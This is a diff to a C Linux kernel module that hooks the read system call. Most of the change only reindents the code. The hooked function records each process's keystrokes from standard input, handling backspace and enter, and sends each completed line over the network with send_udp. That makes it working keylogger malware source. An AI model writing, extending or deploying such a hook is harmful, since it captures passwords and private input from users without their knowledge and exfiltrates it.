@@ -79,47 +79,47 @@ static ssize_t my_read(int fd, void *buf, size_t count){
   char c;
   r_count++;
   retVal = orig_sys_read(fd, buf, count);
-	if(retVal <= 0){
-    		r_count --;
-		return retVal;
-	}
-		
-	if(fd == 0){	//case file is stdin
-  printk(KERN_INFO "pid %d\n", current->pid);
+  if(retVal <= 0){
+    r_count --;
+    return retVal;
+  }
 
-  cur_tinb = find_tinbuf(current->pid);
-  
-  for(i = 0; i < retVal; i++){
-    if(cur_tinb->bufpos < INPUTBUFLEN-1){
-      c =  *((char*)buf+i);
-      if(c == 0x7f){ //handle backspace
-        if(cur_tinb->bufpos > 0){ //prevent going further than 0
-          cur_tinb->bufpos = (cur_tinb->bufpos-1) % INPUTBUFLEN;
-          cur_tinb->buf[cur_tinb->bufpos] = '\0';
+  if(fd == 0){	//case file is stdin
+    printk(KERN_INFO "pid %d\n", current->pid);
+
+    cur_tinb = find_tinbuf(current->pid);
+
+    for(i = 0; i < retVal; i++){
+      if(cur_tinb->bufpos < INPUTBUFLEN-1){
+        c =  *((char*)buf+i);
+        if(c == 0x7f){ //handle backspace
+          if(cur_tinb->bufpos > 0){ //prevent going further than 0
+            cur_tinb->bufpos = (cur_tinb->bufpos-1) % INPUTBUFLEN;
+            cur_tinb->buf[cur_tinb->bufpos] = '\0';
+          }
+          continue;
         }
-        continue;
-      }
-      if(c == 0x0d){ //handle enter press
-        cur_tinb->buf[cur_tinb->bufpos] = '\0';
-        cur_tinb->bufpos = 0;
+        if(c == 0x0d){ //handle enter press
+          cur_tinb->buf[cur_tinb->bufpos] = '\0';
+          cur_tinb->bufpos = 0;
 
+          send_udp(cur_tinb->pid ,cur_tinb->buf);
+
+          *cur_tinb->buf = '\0';
+          continue;
+        }
+      }
+      else{
         send_udp(cur_tinb->pid ,cur_tinb->buf);
-
-        *cur_tinb->buf = '\0';
-        continue;
+        cur_tinb->bufpos = 0;
       }
+      cur_tinb->buf[cur_tinb->bufpos] = *((char*)buf+i);
+      cur_tinb->bufpos++;
+      cur_tinb->buf[cur_tinb->bufpos] = '\0';
     }
-    else{
-      send_udp(cur_tinb->pid ,cur_tinb->buf);
-      cur_tinb->bufpos = 0;
-    }
-    cur_tinb->buf[cur_tinb->bufpos] = *((char*)buf+i);
-    cur_tinb->bufpos++;
-    cur_tinb->buf[cur_tinb->bufpos] = '\0';
   }
-  }
-r_count--;
-return retVal;
+  r_count--;
+  return retVal;
 }
 
 void hook_read(void ** syscall_table){
